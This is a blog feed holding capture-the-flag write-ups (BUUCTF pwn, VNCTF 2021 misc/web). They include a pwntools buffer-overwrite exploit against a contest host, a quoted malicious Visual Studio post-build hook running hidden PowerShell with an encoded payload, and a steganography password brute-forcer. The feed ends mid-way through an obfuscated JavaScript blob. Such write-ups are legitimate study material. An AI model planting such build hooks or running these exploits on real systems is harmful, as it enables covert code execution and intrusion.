id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><p>在<a href="https://www.spigotmc.org/resources/categories/spigot.4/里找到对应的插件，查看其安装使用方法（绝大部分是将jar放在plugins里重启服务器即可）">https://www.spigotmc.org/resources/categories/spigot.4/里找到对应的插件，查看其安装使用方法（绝大部分是将jar放在plugins里重启服务器即可）</a></p><p><img src="/2022/01/26/MC%E6%9C%8D%E5%8A%A1%E5%99%A8building/3.jpg" alt="img"></p><p>很多插件有自己的命令，需要服主自己学习哦。</p><h1 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h1><p>在后台输入op +id即可给予你的角色op，在游戏中输入相应的命令和在后端输入命令等效。</p><p>参考</p><p><a href="https://www.mcbbs.net/thread-661632-1-1.html">https://www.mcbbs.net/thread-661632-1-1.html</a></p><p><a href="https://www.mcbbs.net/thread-1283360-1-1.html">https://www.mcbbs.net/thread-1283360-1-1.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="运维" scheme="https://blog.pillar.fun/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题日记-ciscn-2019-n-8</title>
    <link href="https://blog.pillar.fun/2021/10/21/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn-2019-n-8/"/>
    <id>https://blog.pillar.fun/2021/10/21/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn-2019-n-8/</id>
    <published>2021-10-21T02:59:34.000Z</published>
    <updated>2023-03-14T09:09:32.962Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的pwn刷题日记</p><h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><p>首先checksec</p><p><img src="/2021/10/21/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn-2019-n-8/1.jpg" alt="img"></p><p>开了Canary NX和PIE 是一个32位的程序</p><p>运行一下看看</p><p><img src="/2021/10/21/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn-2019-n-8/2.jpg" alt="img"></p><p>IDA打开康康</p><p><img src="/2021/10/21/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn-2019-n-8/3.jpg" alt="img"></p><p>看到有scanf，和一串var，这个var点进去可以看到是一个全局变量，每个成员都是dword，加上他的注释，可以认为var是一个int数组。</p><p>同时我们看到逻辑，当var[13]的QWARD是17即可getshell。由此写exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27187</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;AAAA&quot;</span>*<span class="number">13</span>+p64(<span class="number">17</span>) <span class="comment"># 因为是QWORD所以要用p64</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/10/21/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn-2019-n-8/4.jpg" alt="img"></p><p>flag{04aaad59-8795-4aa9-bd50-4a25f8888134}</p><p>但是每台搞明白这个v4和v5是咋用的，scanf里int参数是干嘛的呀？</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="pwn" scheme="https://blog.pillar.fun/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>vnctf2021wp</title>
    <link href="https://blog.pillar.fun/2021/03/14/vnctf2021wp/"/>
    <id>https://blog.pillar.fun/2021/03/14/vnctf2021wp/</id>
    <published>2021-03-14T07:12:09.000Z</published>
    <updated>2022-02-21T05:27:24.200Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>习惯了，没有这个导语就不舒服，虽然其实这个导语也没什么能导的 XD</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="happynewyear"><a href="#happynewyear" class="headerlink" title="happynewyear"></a>happynewyear</h2><p>两个hint<br>第一个是这个网站<a href="https://www.dcode.fr/tools-list#symbols">https://www.dcode.fr/tools-list#symbols</a><br>第二个是用stegpy。<br>题目有这个<br><img src="/2021/03/14/vnctf2021wp/1.jpg" alt><br>可以在第一个hint的网站里找到，分别是Chinese Code和Sheikah Language，解出来是f87840bdddcc01e4<br>解开压缩包，得到happynewyear.png<br>然后使用stegpy，发现密码不知道，也没有提示。<br>然后就有点不会了<br>后来看了<a href="https://app.yinxiang.com/fx/7967a020-f748-4090-8398-03afd5146a40">https://app.yinxiang.com/fx/7967a020-f748-4090-8398-03afd5146a40</a> 的wp，暴破得之<br>stegpy库里原有的lsb.py改成lsb2.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_message</span>(<span class="params">self, password=<span class="literal">None</span></span>):</span></span><br><span class="line">    msg = decode_message(self.data)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> password:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            salt = <span class="built_in">bytes</span>(msg[:<span class="number">16</span>])</span><br><span class="line">            msg = crypt.decrypt_info(password, <span class="built_in">bytes</span>(msg[<span class="number">16</span>:]), salt)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="comment"># print(&quot;Wrong password.&quot;)</span></span><br><span class="line">            <span class="keyword">return</span>(<span class="string">&quot;Wrong password.&quot;</span>) <span class="comment">#改为这样</span></span><br></pre></td></tr></table></figure><p>暴破脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> stegpy <span class="keyword">import</span> lsb2</span><br><span class="line"></span><br><span class="line">host = lsb2.HostElement(<span class="string">&#x27;./happynewyear.png&#x27;</span>)</span><br><span class="line">dic = <span class="built_in">open</span>(<span class="string">&#x27;./password.txt&#x27;</span>).readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">    tmp = host.read_message(dic[i][:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> tmp != <span class="string">&quot;Wrong password.&quot;</span>:</span><br><span class="line">        print(tmp)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(i, dic[i][:-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>最后得到flag</p><h2 id="interesting-fishing"><a href="#interesting-fishing" class="headerlink" title="interesting fishing"></a>interesting fishing</h2><p>据说是邮件，因此改为.eml，用windows的mail打开，即可得到一个rar和一张图片。<br><img src="/2021/03/14/vnctf2021wp/3.jpg" alt><br>解压rar，可以看到一个vs项目，直接打开sln，发现是假flag<br><img src="/2021/03/14/vnctf2021wp/4.jpg" alt><br>在项目的.vsxproject可以看到这样一句</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">PostBuildEvent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Command</span>&gt;</span>powershell -exec bypass -w hi&quot;dd&quot;en -f x64\Debug\Browse.VC.db<span class="tag">&lt;/<span class="name">Command</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">PostBuildEvent</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里就是往Briwse.VC.db写了东西，于是查看之，发现内容如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$encodestring &#x3D; &quot;XAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQANwA4AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQAMQA4AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAAzAD8AXAB1AC0ANgA1ADQAOAAxAD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAOAAyAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA1AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAwAD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgAzAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA5AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMwA3AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAOAA5AD8AXAB1AC0ANgA1ADQANQA2AD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMQA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMQA3AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA0AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwAzAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAMgAxAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA3AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANQA4AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMgAwAD8AXAB1AC0ANgA1ADQAMwAyAD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgAxAD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA1AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQANgA5AD8AXAB1AC0ANgA1ADQANQA3AD8AXAB1AC0ANgA1ADQANQAwAD8AXAB1AC0ANgA1ADQANgAzAD8AXAB1AC0ANgA1ADQANgA4AD8AXAB1AC0ANgA1ADQAOQAxAD8AXAB1AC0ANgA1ADQAOAA3AD8AXAB1AC0ANgA1ADQANwA5AD8AXAB1AC0ANgA1ADQAOQA5AD8AXAB1AC0ANgA1ADQAOAA2AD8AXAB1AC0ANgA1ADQAOAA4AD8AXAB1AC0ANgA1ADQAMgA0AD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgA2AD8AXAB1AC0ANgA1ADQAMgA1AD8AXAB1AC0ANgA1ADQAMwAxAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAOQAwAD8AXAB1AC0ANgA1ADQAMgAyAD8AXAB1AC0ANgA1ADQAMwA5AD8AXAB1AC0ANgA1ADQAMgAyAD8A&quot;</span><br><span class="line">$bytes  &#x3D; [System.Convert]::FromBase64String($string);</span><br><span class="line">$decoded &#x3D; [System.Text.Encoding]::UTF8.GetString($bytes); </span><br><span class="line">echo $decoded</span><br></pre></td></tr></table></figure><p>尝试解base64，得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\u-65432?\u-65420?\u-65420?\u-65424?\u-65421?\u-65478?\u-65489?\u-65489?\u-65418?\u-65426?\u-65437?\u-65420?\u-65434?\u-65491?\u-65486?\u-65487?\u-65485?\u-65491?\u-65487?\u-65486?\u-65483?\u-65481?\u-65488?\u-65482?\u-65487?\u-65487?\u-65486?\u-65485?\u-65490?\u-65437?\u-65425?\u-65421?\u-65490?\u-65439?\u-65424?\u-65491?\u-65426?\u-65439?\u-65426?\u-65430?\u-65431?\u-65426?\u-65433?\u-65490?\u-65427?\u-65415?\u-65423?\u-65437?\u-65428?\u-65425?\u-65419?\u-65436?\u-65490?\u-65437?\u-65425?\u-65427?\u-65489?\u-65456?\u-65415?\u-65425?\u-65426?\u-65433?\u-65415?\u-65439?\u-65426?\u-65433?\u-65499?\u-65486?\u-65488?\u-65421?\u-65420?\u-65425?\u-65422?\u-65435?\u-65421?\u-65499?\u-65486?\u-65488?\u-65428?\u-65425?\u-65417?\u-65499?\u-65486?\u-65488?\u-65425?\u-65426?\u-65499?\u-65486?\u-65488?\u-65434?\u-65425?\u-65422?\u-65435?\u-65431?\u-65433?\u-65426?\u-65499?\u-65486?\u-65488?\u-65433?\u-65425?\u-65425?\u-65436?\u-65421?\u-65499?\u-65486?\u-65488?\u-65439?\u-65427?\u-65431?\u-65436?\u-65499?\u-65486?\u-65488?\u-65458?\u-65425?\u-65422?\u-65420?\u-65432?\u-65499?\u-65486?\u-65488?\u-65461?\u-65425?\u-65422?\u-65435?\u-65439?\u-65426?\u-65499?\u-65486?\u-65488?\u-65469?\u-65457?\u-65450?\u-65463?\u-65468?\u-65491?\u-65487?\u-65479?\u-65499?\u-65486?\u-65488?\u-65424?\u-65439?\u-65422?\u-65439?\u-65426?\u-65425?\u-65431?\u-65439?\u-65490?\u-65422?\u-65439?\u-65422?</span><br></pre></td></tr></table></figure><p>用65536-这个值，然后ascii码转换，得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vnctf-213-1257061123.cos.ap-nanjing.myqcloud.com&#x2F;Pyongyang%20stores%20low%20on%20foreign%20goods%20amid%20North%20Korean%20COVID-19%20paranoia.rar</span><br></pre></td></tr></table></figure><p>以上内容实现如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">a&#x3D;&quot;那一串&quot;</span><br><span class="line">b&#x3D;base64.b64decode(a.encode())</span><br><span class="line">c&#x3D;b.decode[::2].replace(r&#39;\u-&#39;,&#39;&#39;).split(&#39;?&#39;)[:-1]</span><br><span class="line">for i in e:</span><br><span class="line">    print(chr(65535-int(i)))</span><br></pre></td></tr></table></figure><p>下载得到一个rar，发现被加密了<br><img src="/2021/03/14/vnctf2021wp/5.jpg" alt><br>在注释里发现提示<br><img src="/2021/03/14/vnctf2021wp/6.jpg" alt><br>使用rar2john和hashcat暴破之，得到密码为9705，打开得到一个docx<br>发现啥也没有。但是发现这个docx其实是一个rar，于是解压之，得到<br><img src="/2021/03/14/vnctf2021wp/7.jpg" alt><br>其中，word下有一个hiden_info.xml打开，发现啥也没有，发现存在零宽隐写<br>在<a href="http://330k.github.io/misc_tools/unicode_steganography.html解密后得">http://330k.github.io/misc_tools/unicode_steganography.html解密后得</a><br><img src="/2021/03/14/vnctf2021wp/8.jpg" alt><br>而另一张图片用oursecret解密即可得到另一半的flag<br><img src="/2021/03/14/vnctf2021wp/10.jpg" alt><br><img src="/2021/03/14/vnctf2021wp/9.jpg" alt></p><h2 id="冰冰"><a href="#冰冰" class="headerlink" title="冰冰"></a>冰冰</h2><p>用binwalk-e提取出文件，叫做FFT.png，因此查找FFT，得到是快速傅里叶<br><a href="https://www.jianshu.com/p/a00da3e03533">https://www.jianshu.com/p/a00da3e03533</a><br>查看上面的文章，写个脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">&#x27;FFT.png&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">ff = np.fft.fft2(img)</span><br><span class="line">xf = np.fft.fftshift(ff)</span><br><span class="line">magnitude_spectrum = <span class="number">20</span>*np.log(np.<span class="built_in">abs</span>(xf))</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">121</span>),plt.imshow(img, cmap = <span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;1&#x27;</span>), plt.xticks([]), plt.yticks([])</span><br><span class="line">plt.subplot(<span class="number">122</span>),plt.imshow(magnitude_spectrum, cmap = <span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;2&#x27;</span>), plt.xticks([]), plt.yticks([])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>即可得到flag<br><img src="/2021/03/14/vnctf2021wp/11.jpg" alt></p><h2 id="节奏医生"><a href="#节奏医生" class="headerlink" title="节奏医生"></a>节奏医生</h2><p>可以看到一个rdzip的文件，是一个节奏医生谱。<br>直接用解压工具解压出来。<br><img src="/2021/03/14/vnctf2021wp/12.jpg" alt><br>一个封面，一个谱，谱长这样，猜测是raw的Wave和Square作为0和1<br><img src="/2021/03/14/vnctf2021wp/13.jpg" alt><br>写个简单的脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">r&#x27;./main.rdlevel&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res=[<span class="string">&#x27;&#x27;</span>]*<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;pulseType&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">        row = line.split(<span class="string">&#x27;, &quot;row&quot;: &#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        row = <span class="built_in">int</span>(row)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Wave&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            res[row] = res[row] + <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Square&quot;</span> <span class="keyword">in</span> line:</span><br><span class="line">            res[row] = res[row] + <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(i), <span class="number">8</span>):</span><br><span class="line">        print(<span class="built_in">chr</span>(<span class="built_in">int</span>(i[j:j+<span class="number">8</span>], <span class="number">2</span>)), end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>解出来是flag{}W31co}me_V&amp;}N_CTF}<br>稍微修改一哈，就得到flag</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h2><p>打开是一个js游戏，说是打通了就有flag。二话不说先去看看有没有源码。<br>然后就发现有<br><a href="https://github.com/killedbyapixel/bounceback">https://github.com/killedbyapixel/bounceback</a><br>然后直接进行一个对比，发现改动在此（当然理论上你应该看代码）<br><img src="/2021/03/14/vnctf2021wp/2.jpg" alt></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;sojson.v4&#39;][&quot;\x66\x69\x6c\x74\x65\x72&quot;][&quot;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&quot;]((([&#39;sojson.v4&#39;]+[])[&quot;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&quot;][&#39;\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65&#39;][&#39;\x61\x70\x70\x6c\x79&#39;](null,&quot;118h97x114w32l95m95N101x110O99d111B100u101w32F61P32u39R106k115w106O105F97z109R105f46p99y111A109U39d44F10G32U32F32r32G95V97p32D61Y32X123W125h44r10M32V32P32x32h95X48M120O98J52A56I51A32r61d32v91o34Q95c100n101M99e111I100l101I34b44r32X34r104N116Z116m112B58A47b47P119M119d119M46z115W111I106V115f111s110m46J99D111W109Z47g106R97c118D97F115L99I114Y105F112v116E111l98m102Q117d115E99x97K116r111U114v46s104d116B109F108Z34e93B59q10m40r102O117f110Z99D116D105a111a110u40Y95J48O120H100Q54k52k50e120I49a41P32f123s10E32j32I32d32K95E48D120k100R54S52g50O120H49y91J95q48X120w98C52a56R51E91m48B93c93E32d61e32w95X48v120b98L52e56b51O91m49b93C10Q125V41N40t95r97g41L59X10M118d97I114t32E95f95x79y120f97D50O55p56y49X32I61j32A91K34i34t44h32L34a45m112w97p117H115M101E100z45m34r44g32Q34y87v105k110E33A32h102S108G97y103u123E116k104V105l115E95F103u97g109Y101I95l105R115A95x102G117h110l110E121M33B125f34N44c32q34f71C97L109O101x32c79k118R101J114R33b34L44V32h34U80g114e101b115c115t32c69w115I99g97u112W101z34C44h32d34a120f34k44B32W34i121H34q44x32P34E99x101x110k116J101Z114j34c44B32s34B117V110j100K101A102U105M110L101x100T34k44u32U34R108t111X103q34W44p32M34o21024U38500O34R44T32u34a29256O26412t21495E65292k106N115v20250y23450F34N44f32V34Q26399e24377C31383B65292R34u44t32j34y36824A35831C25903t25345D25105o20204W30340R24037P20316L34R44y32w34o106Z115A106T105F97b34i44a32m34u109T105L46e99p111F109l34U93m59Y10u108S101q116s32P98f105A103l84N101h120n116V32A61B32t95V95W79u120a97z50N55J56g49r91g48C120L48a93r59K10k105U102S32K40X112d97m117q115P101T100A41S32r123R10r32D32a32X32t98Y105Y103N84I101p120j116U32e61J32R95g95v79i120F97F50n55h56H49d91S48x120N49u93H10C125z59O10C105W102e32t40G119n105T110x84r105G109Y101W114q46C73s115m83G101O116j40m41O41R32S123R10c32I32b32A32V98x105X103v84E101b120V116V32L61P32N95e95u79I120v97W50T55W56i49S91j48m120O50d93k10g125J59G10Q105p102m32Y40O112J108s97c121w101U114u46P73a115D68E101Y97D100E40g41g41Q32Y123r10K32X32T32q32r98b105q103i84o101V120D116v32N61H32b95R95J79q120i97q50X55o56g49G91T48Z120F51G93l59k10c32v32f32e32P68u114l97N119q84f101x120z116m40j95r95I79n120R97E50x55o56h49y91p48Q120z52L93g44k32E109H97Q105E110w67Z97l110d118S97M115j83a105B122j101E91p95n95Y79U120S97H50C55a56l49E91z48w120A53C93Y93I32b47M32o50R44R32w109n97U105b110j67h97M110H118j97X115g83D105M122n101W91J95q95y79x120i97R50Y55z56s49N91z48v120R54s93a93S32I47z32A50k32w43S32f56j48j44T32B52Y50c41O10V125M59f10h68n114V97m119f84G101C120P116u40E98i105M103U84C101e120d116q44f32Z109v97i105R110G67u97m110Q118e97n115K83G105V122M101j91Q95Y95y79M120f97G50k55i56C49c91x48j120R53F93a93L32b47p32Z50k44a32l109c97r105A110W67i97Y110t118H97y115J83H105C122r101R91a95L95s79a120d97M50G55H56k49O91m48p120R54y93d93J32x47y32c50c32Y45d32C56M48i44r32b55G50f44j32x95j95r79S120i97g50J55V56a49a91Y48f120w55c93M44M32s50p41D59x59h59g10r40L102e117n110g99S116k105D111t110Y40M95J48s120f53y49N57K55H120Y50z44F32z95B48b120t53z49A57D55X120n51H44w32o95P48t120g53n49M57G55n120T52U44D32B95A48B120Z53K49H57t55X120d53L44f32o95J48R120D53s49H57d55J120b54Y44w32U95u48g120J53Q49v57B55s120a55H41z32L123K10G32X32F32V32W95k48o120T53S49I57d55s120i55d32O61X32n95B95n79d120E97E50s55o56w49j91N48z120D56R93R59j10p32Q32s32e32H95F48O120Y53F49C57W55r120q53M32f61U32Y102R117F110N99c116V105r111y110w40I95X48h120s53Y49o57q55k120o56Q41f32S123S10R32C32B32t32f32r32q32F32Z105Y102S32o40c116E121R112d101G111f102m32p97d108Q101M114s116V32G33s61C61z32B95p48W120e53S49y57p55Q120C55o41q32L123z10I32u32a32y32W32e32b32h32W32s32m32l32c97I108C101N114t116V40P95w48X120x53F49M57d55B120x56u41F10C32F32A32B32h32F32r32y32w125L59G10o32f32T32O32T32O32c32H32D105d102v32H40i116V121a112R101e111G102B32D99O111n110L115o111X108W101S32D33C61H61G32o95u48e120z53k49d57j55s120E55m41p32c123o10V32I32B32R32A32Y32N32H32E32R32l32V32P99D111R110i115r111m108h101D91Z95i95s79g120K97d50W55w56r49n91E48l120W57W93F93R40P95D48G120q53Q49d57p55q120M56R41F10q32C32N32u32X32T32E32d32X125W10D32P32h32i32Y125N59D10v32J32C32X32B95V48w120K53C49I57r55I120E52C32Q61E32X102o117o110I99u116M105C111z110h40v95g48L120b53d49q57e55J120L57j44C32F95R48X120M53S49U57w55h120I50w41W32r123j10q32e32k32e32y32Z32I32g32z114c101D116A117A114V110w32x95p48H120k53O49r57b55Z120w57Q32N43M32A95I48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55